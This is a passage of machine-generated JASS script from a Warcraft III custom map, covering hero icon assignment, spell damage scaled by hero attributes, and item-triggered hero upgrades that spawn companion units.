call nH(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,"war3mapImported\\BTN Warrior.blp")
call nH(OC[Ma],1,1,"war3mapImported\\BTN Warrior.blp")
elseif GetUnitTypeId(ip)==$48303131 then
call nI(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,true,true)
call nH(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,"war3mapImported\\Ability_Mount_WhiteTiger.blp")
call nH(OC[Ma],1,1,"war3mapImported\\Ability_Mount_WhiteTiger.blp")
elseif GetUnitTypeId(ip)==$48303058 then
call nI(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,true,true)
call nH(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,"ReplaceableTextures\\CommandButtons\\BTNSorceress.blp")
call nH(OC[Ma],1,1,"ReplaceableTextures\\CommandButtons\\BTNSorceress.blp")
elseif GetUnitTypeId(ip)==$48303034 or GetUnitTypeId(ip)==$48303733 then
call nI(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,true,true)
call nH(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,"war3mapImported\\BTNAlgalon.blp")
call nH(OC[Ma],1,1,"war3mapImported\\BTNAlgalon.blp")
elseif GetUnitTypeId(ip)==$48303749 or GetUnitTypeId(ip)==$48303356 or GetUnitTypeId(ip)==$48303744 or GetUnitTypeId(ip)==$48303532 then
call nI(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,true,true)
call nH(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,"war3mapImported\\BTNability2 (16).blp")
call nH(OC[Ma],1,1,"war3mapImported\\BTNability2 (16).blp")
elseif GetUnitTypeId(ip)==$48303036 then
call nI(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,true,true)
call nH(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,"ReplaceableTextures\\CommandButtons\\BTNNecromancer.blp")
call nH(OC[Ma],1,1,"ReplaceableTextures\\CommandButtons\\BTNNecromancer.blp")
elseif GetUnitTypeId(ip)==$48303031 or GetUnitTypeId(ip)==$48303650 then
call nI(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,true,true)
call nH(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,"BTNLevelQQDSJaina.blp")
call nH(OC[Ma],1,1,"BTNLevelQQDSJaina.blp")
elseif GetUnitTypeId(ip)==$48303353 then
call nI(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,true,true)
call nH(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,"war3mapImported\\BTNicon1171.blp")
call nH(OC[Ma],1,1,"war3mapImported\\BTNicon1171.blp")
elseif GetUnitTypeId(ip)==$4830304C then
call nI(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,true,true)
call nH(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,"war3mapImported\\BTNMeiqEiaVU4M.blp")
call nH(OC[Ma],1,1,"war3mapImported\\BTNMeiqEiaVU4M.blp")
elseif GetUnitTypeId(ip)==$4F303032 then
call nI(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,true,true)
call nH(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,"ReplaceableTextures\\CommandButtons\\BTNGuldan.blp")
call nH(OC[Ma],1,1,"ReplaceableTextures\\CommandButtons\\BTNGuldan.blp")
elseif GetUnitTypeId(ip)==$4F303036 or GetUnitTypeId(ip)==$4F303052 then
call nI(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,true,true)
call nH(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,"war3mapImported\\BTNability3-10.blp")
call nH(OC[Ma],1,1,"war3mapImported\\BTNability3-10.blp")
elseif GetUnitTypeId(ip)==$4F303034 or GetUnitTypeId(ip)==$4F303053 then
call nI(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,true,true)
call nH(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,"war3mapImported\\BTNAkama.blp")
call nH(OC[Ma],1,1,"war3mapImported\\BTNAkama.blp")
elseif GetUnitTypeId(ip)==$5530304B or GetUnitTypeId(ip)==$55303133 then
call nI(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,true,true)
call nH(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,"ReplaceableTextures\\CommandButtons\\BTNEvilIllidan.blp")
call nH(OC[Ma],1,1,"ReplaceableTextures\\CommandButtons\\BTNEvilIllidan.blp")
elseif GetUnitTypeId(ip)==$45303057 then
call nI(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,true,true)
call nH(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,"ReplaceableTextures\\CommandButtons\\BTNDemoness.blp")
call nH(OC[Ma],1,1,"ReplaceableTextures\\CommandButtons\\BTNDemoness.blp")
elseif GetUnitTypeId(ip)==$4830314B or GetUnitTypeId(ip)==$48303735 then
call nI(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,true,true)
call nH(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,"war3mapImported\\BTNnatisk-korolevy.blp")
call nH(OC[Ma],1,1,"war3mapImported\\BTNnatisk-korolevy.blp")
elseif GetUnitTypeId(ip)==$4F303030 then
call nI(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,true,true)
call nH(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,"BTNGrommy.blp")
call nH(OC[Ma],1,1,"BTNGrommy.blp")
elseif GetUnitTypeId(ip)==$48303259 then
call nI(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,true,true)
call nH(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,"ReplaceableTextures\\CommandButtons\\BTNJaina.blp")
call nH(OC[Ma],1,1,"ReplaceableTextures\\CommandButtons\\BTNJaina.blp")
elseif GetUnitTypeId(ip)==$45303033 or GetUnitTypeId(ip)==$4530304B or GetUnitTypeId(ip)==$45303055 then
call nI(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,true,true)
call nH(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,"BTNBloodElfRanger_by67chrome.blp")
call nH(OC[Ma],1,1,"BTNBloodElfRanger_by67chrome.blp")
elseif GetUnitTypeId(ip)==$4F303049 then
call nI(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,true,true)
call nH(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,"war3mapImported\\BTNScreenshot_2.blp")
call nH(OC[Ma],1,1,"war3mapImported\\BTNScreenshot_2.blp")
elseif GetUnitTypeId(ip)==$48303030 or GetUnitTypeId(ip)==$4830374B then
call nI(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,true,true)
call nH(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,"war3mapImported\\BTNElfWarlock.blp")
call nH(OC[Ma],1,1,"war3mapImported\\BTNElfWarlock.blp")
if GetUnitAbilityLevel(ip,$41314132)==0 and GetUnitAbilityLevel(ip,$41314130)==0 and GetUnitAbilityLevel(ip,$41314131)==0 then
call UnitAddAbility(ip,$41314130)
call SetPlayerAbilityAvailable(GetOwningPlayer(ip),$41314130,false)
call DestroyEffect(V4[GetPlayerId(GetOwningPlayer(ip))])
set V4[GetPlayerId(GetOwningPlayer(ip))]=AddSpecialEffectTarget("war3mapImported\\MagicCircle_Fire.mdx",ip,"origin")
endif
elseif GetUnitTypeId(ip)==$4F303051 then
call nI(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,true,true)
call nH(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,"war3mapImported\\BTNEmberKnight.blp")
call nH(OC[Ma],1,1,"war3mapImported\\BTNEmberKnight.blp")
elseif GetUnitTypeId(ip)==$4830354D or GetUnitTypeId(ip)==$4830374F then
call nI(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,true,true)
call nH(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,"war3mapImported\\BTNDeath.blp")
call nH(OC[Ma],1,1,"war3mapImported\\BTNDeath.blp")
elseif GetUnitTypeId(ip)==$4830364E then
call nI(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,true,true)
call nH(Pb,1,GetPlayerId(GetOwningPlayer(ip))+2,"war3mapImported\\BTNAllll.blp")
call nH(OC[Ma],1,1,"war3mapImported\\BTNAllll.blp")
endif
set ip=null
endfunction
function B2Z takes nothing returns nothing
local trigger ie
local trigger io
local region NM
local rect NN
set ie=CreateTrigger()
call TriggerRegisterTimerEventSingle(ie,.1)
call TriggerAddAction(ie,function B2W)
set ie=null
set ie=CreateTrigger()
call TriggerRegisterTimerEventSingle(ie,.1)
call TriggerAddAction(ie,function B2X)
set ie=null
set io=CreateTrigger()
set NM=CreateRegion()
set NN=GR
call RegionAddRect(NM,NN)
call TriggerRegisterEnterRegion(io,NM,null)
call TriggerAddAction(io,function B2Y)
set io=null
set NN=null
set NM=null
endfunction
function B2a takes nothing returns boolean
if GetSpellAbilityId()==$41314156 then
return true
endif
return false
endfunction
function B2b takes nothing returns boolean
if not B2a() then
return false
endif
return true
endfunction
function B2c takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==true
endfunction
function B2d takes nothing returns nothing
call UnitDamageTargetBJ(GetTriggerUnit(),GetEnumUnit(),I2R(GetUnitAbilityLevel(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],$41314153)*2)+I2R(GetHeroStr(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],true)+(GetHeroAgi(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],true)+GetHeroInt(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],true))),ATTACK_TYPE_MAGIC,DAMAGE_TYPE_MAGIC)
endfunction
function B2e takes nothing returns boolean
if GetSpellAbilityId()==$41314230 then
return true
endif
if GetSpellAbilityId()==$4131415A then
return true
endif
return false
endfunction
function B2f takes nothing returns boolean
if not B2e() then
return false
endif
return true
endfunction
function B2g takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(GetTriggerUnit()))==true
endfunction
function B2h takes nothing returns nothing
call UnitDamageTargetBJ(GetTriggerUnit(),GetEnumUnit(),I2R(GetUnitAbilityLevel(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],$41305336)*2)+I2R(GetHeroStr(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],true)+(GetHeroAgi(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],true)+GetHeroInt(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],true))),ATTACK_TYPE_MAGIC,DAMAGE_TYPE_MAGIC)
endfunction
function B2i takes nothing returns boolean
if GetSpellAbilityId()==$41314159 then
return true
endif
return false
endfunction
function B2j takes nothing returns boolean
if not B2i() then
return false
endif
return true
endfunction
function B2k takes nothing returns nothing
local integer Ma=GetPlayerId(GetOwningPlayer(GetTriggerUnit()))
if B2b() then
call UnitDamageTargetBJ(GetTriggerUnit(),GetSpellTargetUnit(),I2R(GetUnitAbilityLevel(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],$41305335)*2)+I2R(GetHeroStr(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],true)+(GetHeroAgi(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],true)+GetHeroInt(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],true))),ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
call UnitDamageTargetBJ(GetTriggerUnit(),GetSpellTargetUnit(),I2R(GetUnitAbilityLevel(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],$41314154)*2)+I2R(GetHeroStr(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],true)+(GetHeroAgi(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],true)+GetHeroInt(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],true))),ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
else
endif
if B2f() then
set V0=GetSpellTargetLoc()
set SR=GetUnitsInRangeOfLocMatching(400.,V0,Condition(function B2c))
call ForGroupBJ(SR,function B2d)
call DestroyGroup(SR)
call RemoveLocation(V0)
else
endif
if B2j() then
set V0=GetUnitLoc(GetTriggerUnit())
set SR=GetUnitsInRangeOfLocMatching(900.,V0,Condition(function B2g))
call ForGroupBJ(SR,function B2h)
call DestroyGroup(SR)
call RemoveLocation(V0)
else
endif
if GetSpellAbilityId()==$41313952 then
call m0(GetTriggerUnit(),GetSpellTargetUnit(),GetUnitAbilityLevel(MT[Ma],$41305334)*2*(GetHeroStr(MT[Ma],true)+GetHeroAgi(MT[Ma],true)+GetHeroInt(MT[Ma],true)))
if GetRandomInt(1,7)==1 then
call SetUnitState(MT[Ma],UNIT_STATE_LIFE,GetUnitState(MT[Ma],UNIT_STATE_LIFE)+GetUnitState(MT[Ma],UNIT_STATE_MAX_LIFE)*(.04+.01*I2R(GetUnitAbilityLevel(MT[Ma],$41305334))))
call SetUnitState(MT[Ma],UNIT_STATE_MANA,GetUnitState(MT[Ma],UNIT_STATE_MANA)+GetUnitState(MT[Ma],UNIT_STATE_MAX_MANA)*(.04+.01*I2R(GetUnitAbilityLevel(MT[Ma],$41305334))))
call BJDebugMsg(R2S(GetUnitState(MT[Ma],UNIT_STATE_MAX_LIFE)*(.04+.01*I2R(GetUnitAbilityLevel(MT[Ma],$41305334)))))
endif
endif
endfunction
function B2l takes nothing returns nothing
set iq=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(iq,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(iq,function B2k)
endfunction
function B2m takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$49305849) then
return false
endif
if not (S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]==true) then
return false
endif
return true
endfunction
function B2n takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$49305848) then
return false
endif
if not (S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]==true) then
return false
endif
return true
endfunction
function B2o takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$49304A46) then
return false
endif
if not (S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]==true) then
return false
endif
return true
endfunction
function B2p takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$49304A47) then
return false
endif
if not (S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]==true) then
return false
endif
return true
endfunction
function B2q takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$49304A48) then
return false
endif
if not (S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]==true) then
return false
endif
return true
endfunction
function B2r takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$49304A45) then
return false
endif
if not (S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]==true) then
return false
endif
return true
endfunction
function B2s takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
if not (GetUnitLevel(GetTriggerUnit())>=40) then
return false
endif
return true
endfunction
function B2t takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$4930584C)==true) then
return false
endif
if not (GetUnitTypeId(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$65303135) then
return false
endif
return true
endfunction
function B2u takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$4930584A)==true) then
return false
endif
if not (GetUnitTypeId(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$65303136) then
return false
endif
return true
endfunction
function B2v takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$49304A4A)==true) then
return false
endif
if not (GetUnitTypeId(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$6E30354A) then
return false
endif
return true
endfunction
function B2w takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$49304A4D)==true) then
return false
endif
if not (GetUnitTypeId(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$6E303549) then
return false
endif
return true
endfunction
function B2x takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$49304A4C)==true) then
return false
endif
if not (GetUnitTypeId(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$65303050) then
return false
endif
return true
endfunction
function B2y takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$49304A4B)==true) then
return false
endif
if not (GetUnitTypeId(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$6F303044) then
return false
endif
return true
endfunction
function B2z takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
if not (GetUnitLevel(GetTriggerUnit())>=51) then
return false
endif
if not (GetItemTypeId(GetManipulatedItem())==$49304A49) then
return false
endif
return true
endfunction
function B20 takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$4930584D)==true) then
return false
endif
if not (GetUnitTypeId(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$65303135) then
return false
endif
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41314154)==2) then
return false
endif
return true
endfunction
function B21 takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$4930584B)==true) then
return false
endif
if not (GetUnitTypeId(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$65303136) then
return false
endif
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41314153)==2) then
return false
endif
return true
endfunction
function B22 takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$49304D44)==true) then
return false
endif
if not (GetUnitTypeId(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$6E30354A) then
return false
endif
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41305333)==2) then
return false
endif
return true
endfunction
function B23 takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$49304D43)==true) then
return false
endif
if not (GetUnitTypeId(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$6E303549) then
return false
endif
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41305335)==2) then
return false
endif
return true
endfunction
function B24 takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$49304D41)==true) then
return false
endif
if not (GetUnitTypeId(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$65303050) then
return false
endif
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41305336)==2) then
return false
endif
return true
endfunction
function B25 takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$49304D42)==true) then
return false
endif
if not (GetUnitTypeId(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$6F303044) then
return false
endif
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41305334)==2) then
return false
endif
return true
endfunction
function B26 takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
if not (GetUnitLevel(GetTriggerUnit())>=52) then
return false
endif
if not (GetItemTypeId(GetManipulatedItem())==$49304D45) then
return false
endif
return true
endfunction
function B27 takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$4930584F)==true) then
return false
endif
if not (GetUnitTypeId(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$65303135) then
return false
endif
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41314154)==3) then
return false
endif
return true
endfunction
function B28 takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$49305850)==true) then
return false
endif
if not (GetUnitTypeId(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$65303136) then
return false
endif
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41314153)==3) then
return false
endif
return true
endfunction
function B29 takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$49305854)==true) then
return false
endif
if not (GetUnitTypeId(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$6E30354A) then
return false
endif
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41305333)==3) then
return false
endif
return true
endfunction
function B3B takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$49305853)==true) then
return false
endif
if not (GetUnitTypeId(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$6E303549) then
return false
endif
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41305335)==3) then
return false
endif
return true
endfunction
function B3C takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$49305851)==true) then
return false
endif
if not (GetUnitTypeId(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$65303050) then
return false
endif
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41305336)==3) then
return false
endif
return true
endfunction
function B3D takes nothing returns boolean
if not (UnitHasItemOfTypeBJ(GetTriggerUnit(),$49305852)==true) then
return false
endif
if not (GetUnitTypeId(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))])==$6F303044) then
return false
endif
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41305334)==3) then
return false
endif
return true
endfunction
function B3E takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
if not (GetUnitLevel(GetTriggerUnit())>=55) then
return false
endif
if not (GetItemTypeId(GetManipulatedItem())==$4930584E) then
return false
endif
return true
endfunction
function B3F takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
if not (GetUnitLevel(GetTriggerUnit())==50) then
return false
endif
if not (GetItemTypeId(GetManipulatedItem())==$49304A4E) then
return false
endif
return true
endfunction
function B3G takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
if not (GetUnitLevel(GetTriggerUnit())==51) then
return false
endif
if not (GetItemTypeId(GetManipulatedItem())==$49304D39) then
return false
endif
return true
endfunction
function B3H takes nothing returns nothing
if B2s() then
if B2m() then
set UM[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))+3
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49305849))
set V0=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$65303135,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
set Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetLastCreatedUnit()
call UnitAddAbility(GetTriggerUnit(),$41314154)
call UnitMakeAbilityPermanent(GetTriggerUnit(),true,$41314154)
call RemoveLocation(V0)
set S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=false
else
endif
if B2n() then
set N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.03
set UI[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UI[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+3
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49305848))
set V0=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$65303136,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
set Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetLastCreatedUnit()
call UnitAddAbility(GetTriggerUnit(),$41314153)
call UnitMakeAbilityPermanent(GetTriggerUnit(),true,$41314153)
call RemoveLocation(V0)
set S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=false
else
endif
if B2o() then
set Nf[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=Nf[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.03
set UK[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UK[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+3
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304A46))
set V0=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$6F303044,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
set Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetLastCreatedUnit()
call UnitAddAbility(GetTriggerUnit(),$41305334)
call UnitMakeAbilityPermanent(GetTriggerUnit(),true,$41305334)
call RemoveLocation(V0)
set S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=false
else
endif
if B2p() then
set Ng[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=Ng[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.03
set UG[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UG[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+3
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304A47))
set V0=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$6E303549,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
set Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetLastCreatedUnit()
call UnitAddAbility(GetTriggerUnit(),$41305335)
call UnitMakeAbilityPermanent(GetTriggerUnit(),true,$41305335)
call RemoveLocation(V0)
set S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=false
else
endif
if B2q() then
set Nd[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=Nd[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.03
set UH[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UH[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+3
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304A48))
set V0=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$6E30354A,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
set Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetLastCreatedUnit()
call UnitAddAbility(GetTriggerUnit(),$41305333)
call UnitMakeAbilityPermanent(GetTriggerUnit(),true,$41305333)
call RemoveLocation(V0)
set S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=false
else
endif
if B2r() then
set TQ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=TQ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.03
set UJ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UJ[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+3
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304A45))
set V0=GetUnitLoc(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$65303050,GetOwningPlayer(GetTriggerUnit()),V0,bj_UNIT_FACING)
set Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetLastCreatedUnit()
call UnitAddAbility(GetTriggerUnit(),$41305336)
call UnitMakeAbilityPermanent(GetTriggerUnit(),true,$41305336)
call RemoveLocation(V0)
set S0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=false
else
endif
else
endif
if B2z() then
if B2t() then
set UM[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UM[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+3
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$4930584C))
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304A49))
call SetUnitVertexColor(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],0,255,0,255)
call SetUnitAbilityLevel(MT[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))-1],$41314154,2)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41314232,2)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41314231,2)
call SetUnitAbilityLevel(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],$41314156,2)
else
endif
if B2u() then
set N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=N0[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+.03
set UI[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=UI[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+3
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$4930584A))
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49304A49))
call SetUnitVertexColor(Nc[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],0,255,0,255)
